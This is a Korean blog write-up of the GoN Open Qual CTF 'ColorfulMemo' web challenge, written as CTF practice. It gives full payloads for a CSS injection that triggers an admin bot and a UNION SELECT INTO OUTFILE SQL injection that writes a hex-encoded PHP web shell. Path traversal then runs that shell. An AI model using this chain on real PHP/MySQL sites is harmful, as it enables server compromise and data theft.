---
title: 2022 Spring GoN Open Qual CTF - ColorfulMemo (풀이 봄)
date: 2022-08-03 15:05 +0900
categories: [Hacking, CTF]
tags: [CSS Injection, mysql select into outfile injection, mysql hex 표현방식, 풀이 봄]
---

## ColorfulMemo (풀이 봄)
<hr style="border-top: 1px solid;"><br>

굉장히 많은 소스코드들이 있고 플래그 파일은 ```/flag/{hash}``` 형태로 저장되어 있다.

페이지는 main, write, list, read, submit, check 페이지가 있다.

<br>

+ init.sql

```sql
GRANT FILE ON *.* to 'user'@'%';
FLUSH PRIVILEGES;

USE colorfulmemo;

CREATE TABLE memo (
    id int primary key auto_increment,
    title varchar(255) not null,
    color varchar(255) not null,
    content varchar(1023) not null,
    adminCheck int not null
);

```

<br>

+ my.cnf

```
[mysqld]
pid-file        = /var/run/mysqld/mysqld.pid
socket          = /var/run/mysqld/mysqld.sock
datadir         = /var/lib/mysql
secure-file-priv= /tmp/
default_authentication_plugin=mysql_native_password

# Custom config should go here
!includedir /etc/mysql/conf.d/
```

<br><br>
<hr style="border: 2px solid;">
<br><br>

## Solution
<hr style="border-top: 1px solid;"><br>

우선 위에 올려놓은 코드를 살펴보면 2가지 중요한 사실이 있다.

<br>

+ ```GRANT FILE ON *.* to 'user'@'%'; FLUSH PRIVILEGES;```
  + 이 코드를 통해 모든 파일을 user가 볼 수 있다.

<br>

+ ```secure-file-priv= /tmp/```
  + MySQL 5.1.17 이후부터 보안을 위해 파일 입/출력 전용 경로를 지정할 수 있다고 한다.
  + 위의 코드를 통해 mysql에서 입/출력이 가능한 경로로 ```/tmp```를 설정한 것이다.

<br>

문제를 풀기 전에 이제 sql로 동작하는 페이지에서 flag 페이지를 출력하기 위해서는 ```select ... into outfile ...``` 을 통해 불러와야 하는 것은 추측할 수 있었다.

```SELECT ... INTO OUTFILE writes the selected rows to a file. Column and line terminators can be specified to produce a specific output format.```

<br>

하지만 공격 벡터를 찾을 수 없었다.. 해서 풀이를 보았다.
: <a href="https://velog.io/@whtmdgus56/GoN-Open-Qual-CTF-Colorfulmemo" target="_blank">velog.io/@whtmdgus56/GoN-Open-Qual-CTF-Colorfulmemo</a>

<br>

생각지도 못한 지점이었다..

id 부분을 공격해야함은 알고 있었으나, ```ctype_digit()```과 ```bind_param``` 부분을 우회할 수 있는 방안이 있는지만 찾고 있었다.

공격 벡터는 read.php의 코드 중 아래와 같다.

<br>

```
<style>
    .content{
        color:<?php echo $color ?>
    }
</style>
```

<br>

하... 보고 이걸 왜 못찾았지 싶었다.. CSS Injection 문제에 대해 거의 풀어보지 못한 것이 문제인가..

이 부분에 추가적인 CSS 값을 넣을 수 있다. (드림핵 강의를 참고)

우리는 id 부분을 우회를 해야 하므로 css 코드 중 url을 불러오는 코드 중 강의에서도 사용 된 ```background: url('')```가 있다.

<br>

첫 게시글을 만들고 다음 게시글에 ```memoColor``` 값으로 ```yellow; background: url('http://localhost/check.php?id=1')```을 준 뒤 2번째 게시글을 본 뒤 리스트 페이지를 확인해보면.. 안된다.

이 부분에서 혼란스러웠는데, 당연히 2번 게시글을 들어가면 인젝션한 css 코드를 로컬에서 불러오는거라 생각했는데, 잘못된 생각이었다.

bot.py에서 로컬에서 id값을 read.php와 check.php로 각각 보내는데 이 부분을 거쳐야 한다.

**read를 통해 로컬이 2번 게시글을 읽게 함으로써 인젝션한 css 코드가 로컬에서 실행되는 것이다.**

따라서 2번 게시글을 submit 해주면 1번 게시글도 같이 adminCheck가 되는 것을 확인할 수 있다.

<br>

이제 플래그를 찾아야 한다.

먼저 플래그의 위치를 찾아야 하므로 ```/tmp``` 경로에 셸을 올려서 확인해야 한다.

따라서 ```?id=1 union select '<?php system('ls') ?>' into outfile '/tmp/shell.php'```을 해주면 되는데, read.php 코드를 보면 ```<, >```을 replace 하는 코드가 있다.

<br>

이 부분을 우회하기 위해 mysql에서 hex를 표현하는 방식을 이용할 수 있다.
: <a href="https://dev.mysql.com/doc/refman/8.0/en/hexadecimal-literals.html" target="_blank">dev.mysql.com/doc/refman/8.0/en/hexadecimal-literals.html</a>

<br>

따라서 ```<?php system('ls') ?>```를 hex로 변환해주면 ```X'3c3f706870206563686f2073797374656d28276364202f3b6c733b2729203f3e'```가 된다.

이제 burp나 postman으로 페이로드를 보낸 뒤 게시글을 submit 해주면 된다.
: ```yellow; background: url("http://localhost/check.php?id=1 union select X'3c3f706870206563686f2073797374656d28276364202f3b6c733b2729203f3e' into outfile '/tmp/shell.php'")```

<br>

그 다음 ```?path=../../../../../../../../../tmp/shell.php```로 가면 ```flag_{hash}```가 있으므로 플래그를 출력해주는 코드를 다시 보내준 뒤 확인해보면 플래그가 있다..

<br><br>
<hr style="border: 2px solid;">
<br><br>
